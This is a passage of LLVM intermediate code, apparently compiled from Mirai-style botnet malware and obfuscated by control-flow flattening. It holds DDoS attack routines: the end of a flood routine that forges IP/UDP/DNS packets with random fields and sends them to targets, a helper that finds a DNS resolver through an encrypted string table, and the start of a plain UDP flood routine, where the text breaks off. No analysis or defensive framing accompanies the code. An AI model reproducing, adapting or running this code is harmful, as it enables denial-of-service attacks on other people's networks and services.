  %234 = load i8*, i8** %30, align 8
  store i8 %233, i8* %234, align 1
  store i8 0, i8* %24, align 1
  %235 = load i8, i8* %25, align 1
  %236 = add i8 %235, 1
  store i8 %236, i8* %25, align 1
  %237 = load i8*, i8** %29, align 8
  %238 = load i32, i32* %23, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds i8, i8* %237, i64 %239
  %241 = getelementptr inbounds i8, i8* %240, i64 1
  store i8* %241, i8** %30, align 8
  store i32 -1669415731, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i8, i8* %24, align 1
  %244 = add i8 %243, 1
  store i8 %244, i8* %24, align 1
  store i32 -1669415731, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  store i32 1797829454, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i32, i32* %23, align 4
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %23, align 4
  store i32 1220850054, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i8, i8* %24, align 1
  %251 = load i8*, i8** %30, align 8
  store i8 %250, i8* %251, align 1
  %252 = load i8*, i8** %29, align 8
  %253 = load i32, i32* %21, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds i8, i8* %252, i64 %254
  %256 = getelementptr inbounds i8, i8* %255, i64 2
  %257 = bitcast i8* %256 to %struct.grehdr*
  store %struct.grehdr* %257, %struct.grehdr** %31, align 8
  %258 = call zeroext i16 @htons(i16 zeroext 1) #7
  %259 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %260 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %259, i32 0, i32 0
  store i16 %258, i16* %260, align 2
  %261 = call zeroext i16 @htons(i16 zeroext 1) #7
  %262 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %263 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %262, i32 0, i32 1
  store i16 %261, i16* %263, align 2
  store i32 867171941, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = add nsw i32 %265, 1
  store i32 %266, i32* %9, align 4
  store i32 -576746418, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  store i32 153356381, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 382521061, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i32, i32* %9, align 4
  %271 = load i8, i8* %5, align 1
  %272 = zext i8 %271 to i32
  %273 = icmp slt i32 %270, %272
  %274 = select i1 %273, i32 287523686, i32 686282128
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i8**, i8*** %11, align 8
  %277 = load i32, i32* %9, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds i8*, i8** %276, i64 %278
  %280 = load i8*, i8** %279, align 8
  store i8* %280, i8** %32, align 8
  %281 = load i8*, i8** %32, align 8
  %282 = bitcast i8* %281 to %struct.iphdr*
  store %struct.iphdr* %282, %struct.iphdr** %33, align 8
  %283 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i64 1
  %285 = bitcast %struct.iphdr* %284 to %struct.udphdr*
  store %struct.udphdr* %285, %struct.udphdr** %34, align 8
  %286 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i64 1
  %288 = bitcast %struct.udphdr* %287 to %struct.dnshdr*
  store %struct.dnshdr* %288, %struct.dnshdr** %35, align 8
  %289 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %290 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %289, i64 1
  %291 = bitcast %struct.dnshdr* %290 to i8*
  %292 = getelementptr inbounds i8, i8* %291, i64 1
  store i8* %292, i8** %36, align 8
  %293 = load i16, i16* %13, align 2
  %294 = zext i16 %293 to i32
  %295 = icmp eq i32 %294, 65535
  %296 = select i1 %295, i32 1082054699, i32 1490460749
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = call i32 @rand_next()
  %299 = and i32 %298, 65535
  %300 = trunc i32 %299 to i16
  %301 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 3
  store i16 %300, i16* %302, align 4
  store i32 1490460749, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i16, i16* %16, align 2
  %305 = zext i16 %304 to i32
  %306 = icmp eq i32 %305, 65535
  %307 = select i1 %306, i32 -576851030, i32 -1783007513
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 0
  store i16 %311, i16* %313, align 2
  store i32 -1783007513, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i16, i16* %17, align 2
  %316 = zext i16 %315 to i32
  %317 = icmp eq i32 %316, 65535
  %318 = select i1 %317, i32 359752554, i32 1318289730
  store i32 %318, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  %320 = call i32 @rand_next()
  %321 = and i32 %320, 65535
  %322 = trunc i32 %321 to i16
  %323 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 1
  store i16 %322, i16* %324, align 2
  store i32 1318289730, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  %326 = load i16, i16* %18, align 2
  %327 = zext i16 %326 to i32
  %328 = icmp eq i32 %327, 65535
  %329 = select i1 %328, i32 927933937, i32 544532475
  store i32 %329, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = call i32 @rand_next()
  %332 = and i32 %331, 65535
  %333 = trunc i32 %332 to i16
  %334 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %335 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %334, i32 0, i32 0
  store i16 %333, i16* %335, align 2
  store i32 544532475, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i8*, i8** %36, align 8
  %338 = load i8, i8* %19, align 1
  %339 = zext i8 %338 to i32
  call void @rand_alpha_str(i8* %337, i32 %339)
  %340 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 7
  store i16 0, i16* %341, align 2
  %342 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %343 = bitcast %struct.iphdr* %342 to i16*
  %344 = call zeroext i16 @checksum_generic(i16* %343, i32 20)
  %345 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 7
  store i16 %344, i16* %346, align 2
  %347 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 3
  store i16 0, i16* %348, align 2
  %349 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %350 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %351 = bitcast %struct.udphdr* %350 to i8*
  %352 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %353 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %352, i32 0, i32 2
  %354 = load i16, i16* %353, align 2
  %355 = load i8, i8* %19, align 1
  %356 = zext i8 %355 to i64
  %357 = add i64 21, %356
  %358 = add i64 %357, 2
  %359 = load i32, i32* %21, align 4
  %360 = sext i32 %359 to i64
  %361 = add i64 %358, %360
  %362 = add i64 %361, 4
  %363 = trunc i64 %362 to i32
  %364 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %349, i8* %351, i16 zeroext %354, i32 %363)
  %365 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %366 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %365, i32 0, i32 3
  store i16 %364, i16* %366, align 2
  %367 = load i32, i32* %22, align 4
  %368 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i32 0, i32 0
  %373 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %372, i32 0, i32 2
  %374 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %373, i32 0, i32 0
  store i32 %367, i32* %374, align 4
  %375 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %376 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %375, i32 0, i32 1
  %377 = load i16, i16* %376, align 2
  %378 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %379 = load i32, i32* %9, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i64 %380
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i32 0, i32 0
  %383 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %382, i32 0, i32 1
  store i16 %377, i16* %383, align 2
  %384 = load i32, i32* %10, align 4
  %385 = load i8*, i8** %32, align 8
  %386 = load i8, i8* %19, align 1
  %387 = zext i8 %386 to i64
  %388 = add i64 41, %387
  %389 = add i64 %388, 2
  %390 = load i32, i32* %21, align 4
  %391 = sext i32 %390 to i64
  %392 = add i64 %389, %391
  %393 = add i64 %392, 4
  %394 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %395 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %396 = load i32, i32* %9, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 0
  %400 = bitcast %struct.sockaddr_in* %399 to %struct.sockaddr*
  store %struct.sockaddr* %400, %struct.sockaddr** %394, align 8
  %401 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %402 = load %struct.sockaddr*, %struct.sockaddr** %401, align 8
  %403 = call i64 @sendto(i32 %384, i8* %385, i64 %393, i32 16384, %struct.sockaddr* %402, i32 16)
  store i32 1031794705, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = load i32, i32* %9, align 4
  %406 = add nsw i32 %405, 1
  store i32 %406, i32* %9, align 4
  store i32 382521061, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  store i32 153356381, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %407, %404, %336, %330, %325, %319, %314, %308, %303, %297, %275, %269, %268, %267, %264, %249, %246, %245, %242, %232, %223, %218, %165, %161, %105, %99, %98, %95, %89, %88, %82, %81, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %.reg2mem8 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %11 = call i8* @table_retrieve_val(i32 21, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 21)
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1557649764, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 -1557649764, label %first
    i32 -388359539, label %16
    i32 1347143108, label %30
    i32 -1417892383, label %32
    i32 859880142, label %37
    i32 -1518267, label %45
    i32 678326991, label %50
    i32 -1252250438, label %55
    i32 -966234149, label %56
    i32 295972525, label %57
    i32 1788717253, label %58
    i32 -1690464761, label %63
    i32 956061220, label %68
    i32 1084770769, label %73
    i32 964971436, label %79
    i32 324352982, label %93
    i32 -201247401, label %94
    i32 1531394156, label %97
    i32 15721392, label %101
    i32 -1492310842, label %104
    i32 720686238, label %105
    i32 -860534774, label %106
    i32 -480957957, label %NodeBlock5
    i32 583933319, label %NodeBlock3
    i32 50866103, label %LeafBlock1
    i32 -1990666427, label %NodeBlock
    i32 -1715504598, label %LeafBlock
    i32 -509076195, label %114
    i32 1450964602, label %116
    i32 991909039, label %118
    i32 -207877632, label %120
    i32 -443928017, label %NewDefault
    i32 -576898919, label %122
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sge i32 %.reload, 0
  %15 = select i1 %14, i32 -388359539, i32 -860534774
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %2, align 4
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %19 = call i64 @read(i32 %17, i8* %18, i64 2048)
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* %2, align 4
  %22 = call i32 @close(i32 %21)
  call void @table_unlock_val(i8 zeroext 22)
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %24 = load i32, i32* %3, align 4
  %25 = call i8* @table_retrieve_val(i32 22, i32* null)
  %26 = call i32 @util_stristr(i8* %23, i32 %24, i8* %25)
  store i32 %26, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 22)
  %27 = load i32, i32* %4, align 4
  %28 = icmp ne i32 %27, -1
  %29 = select i1 %28, i32 1347143108, i32 720686238
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %6, align 4
  store i32 -1417892383, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %6, align 4
  %34 = load i32, i32* %3, align 4
  %35 = icmp slt i32 %33, %34
  %36 = select i1 %35, i32 859880142, i32 1531394156
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %6, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  store i8 %41, i8* %10, align 1
  %42 = load i8, i8* %8, align 1
  %43 = icmp ne i8 %42, 0
  %44 = select i1 %43, i32 1788717253, i32 -1518267
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 -1252250438, i32 678326991
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8, i8* %10, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 9
  %54 = select i1 %53, i32 -1252250438, i32 -966234149
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 -201247401, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i8 1, i8* %8, align 1
  store i32 295972525, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1788717253, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8, i8* %10, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp ne i32 %60, 46
  %62 = select i1 %61, i32 -1690464761, i32 1084770769
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8, i8* %10, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp slt i32 %65, 48
  %67 = select i1 %66, i32 964971436, i32 956061220
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8, i8* %10, align 1
  %70 = sext i8 %69 to i32
  %71 = icmp sgt i32 %70, 57
  %72 = select i1 %71, i32 964971436, i32 1084770769
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* %3, align 4
  %76 = sub nsw i32 %75, 1
  %77 = icmp eq i32 %74, %76
  %78 = select i1 %77, i32 964971436, i32 324352982
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %81 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %82 = load i32, i32* %4, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = load i32, i32* %6, align 4
  %86 = load i32, i32* %4, align 4
  %87 = sub nsw i32 %85, %86
  call void @util_memcpy(i8* %80, i8* %84, i32 %87)
  %88 = load i32, i32* %6, align 4
  %89 = load i32, i32* %4, align 4
  %90 = sub nsw i32 %88, %89
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %91
  store i8 0, i8* %92, align 1
  store i8 1, i8* %9, align 1
  store i32 1531394156, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -201247401, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %6, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %6, align 4
  store i32 -1417892383, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i8, i8* %9, align 1
  %99 = icmp ne i8 %98, 0
  %100 = select i1 %99, i32 15721392, i32 -1492310842
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  store i32 -576898919, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 720686238, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 -860534774, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  store i32 %108, i32* %.reg2mem8
  store i32 -480957957, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem8
  %Pivot6 = icmp slt i32 %.reload13, 2
  %109 = select i1 %Pivot6, i32 -1990666427, i32 583933319
  store i32 %109, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem8
  %Pivot4 = icmp slt i32 %.reload10, 3
  %110 = select i1 %Pivot4, i32 991909039, i32 50866103
  store i32 %110, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf2 = icmp eq i32 %.reload9, 3
  %111 = select i1 %SwitchLeaf2, i32 -207877632, i32 -443928017
  store i32 %111, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem8
  %Pivot = icmp slt i32 %.reload12, 1
  %112 = select i1 %Pivot, i32 -1715504598, i32 1450964602
  store i32 %112, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf = icmp eq i32 %.reload11, 0
  %113 = select i1 %SwitchLeaf, i32 -509076195, i32 -443928017
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = call i32 @htonl(i32 134744072) #7
  store i32 %115, i32* %1, align 4
  store i32 -576898919, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call i32 @htonl(i32 1246898730) #7
  store i32 %117, i32* %1, align 4
  store i32 -576898919, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = call i32 @htonl(i32 1074151430) #7
  store i32 %119, i32* %1, align 4
  store i32 -576898919, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = call i32 @htonl(i32 67240450) #7
  store i32 %121, i32* %1, align 4
  store i32 -576898919, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -576898919, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32, i32* %1, align 4
  ret i32 %123

loopEnd:                                          ; preds = %NewDefault, %120, %118, %116, %114, %LeafBlock, %NodeBlock, %LeafBlock1, %NodeBlock3, %NodeBlock5, %106, %105, %104, %101, %97, %94, %93, %79, %73, %68, %63, %58, %57, %56, %55, %50, %45, %37, %32, %30, %16, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  store i32 %49, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2132204391, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2132204391, label %first
    i32 -425128959, label %52
    i32 -1418982812, label %55
    i32 -667456350, label %58
    i32 -1209470143, label %59
    i32 1894353830, label %65
    i32 -672127972, label %75
    i32 -1889252871, label %84
    i32 -1190264453, label %93
    i32 1295729876, label %101
    i32 -665877075, label %102
    i32 -1906536903, label %120
    i32 1968875458, label %121
    i32 1000849688, label %131
    i32 -1256665283, label %157
    i32 -1864406455, label %175
    i32 -1032806395, label %176
    i32 558093695, label %177
    i32 116859881, label %180
    i32 -552397716, label %181
    i32 900246196, label %182
    i32 316433147, label %188
    i32 -1800244028, label %197
    i32 877099435, label %201
    i32 -366126949, label %211
    i32 802407717, label %214
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %50 = icmp eq i32 %.reload, 65535
  %51 = select i1 %50, i32 -425128959, i32 -1418982812
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  store i32 -667456350, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #7
  store i16 %57, i16* %13, align 2
  store i32 -667456350, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1209470143, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  %64 = select i1 %63, i32 1894353830, i32 116859881
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %67 = load i8**, i8*** %10, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  store i8* %66, i8** %70, align 8
  %71 = load i16, i16* %12, align 2
  %72 = zext i16 %71 to i32
  %73 = icmp eq i32 %72, 65535
  %74 = select i1 %73, i32 -672127972, i32 -1889252871
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  %78 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 0
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %82, i32 0, i32 1
  store i16 %77, i16* %83, align 2
  store i32 -1190264453, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i16, i16* %12, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %85) #7
  %87 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i64 %89
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %90, i32 0, i32 0
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %91, i32 0, i32 1
  store i16 %86, i16* %92, align 2
  store i32 -1190264453, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %95 = load i32*, i32** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  store i32 %94, i32* %98, align 4
  %99 = icmp eq i32 %94, -1
  %100 = select i1 %99, i32 1295729876, i32 -665877075
